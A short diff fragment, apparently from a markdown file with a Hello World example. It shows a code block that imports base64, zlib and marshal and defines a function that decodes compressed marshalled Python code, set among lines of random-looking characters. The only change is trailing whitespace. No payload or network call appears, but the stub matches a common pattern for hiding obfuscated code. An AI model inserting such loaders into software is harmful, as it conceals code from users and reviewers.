@@ -18,7 +18,7 @@ print("Hello World!")
 ``` 
 import base64, zlib, marshal
 #N\X\w=f(msRF?5&LNWz8
-i4:~+=GY?JzwOfnl2VE/
+i4:~+=GY?JzwOfnl2VE/ 
 def _d(s):
     return marshal.loads(zlib.decompress(base64.b64decode(s)))
 #G
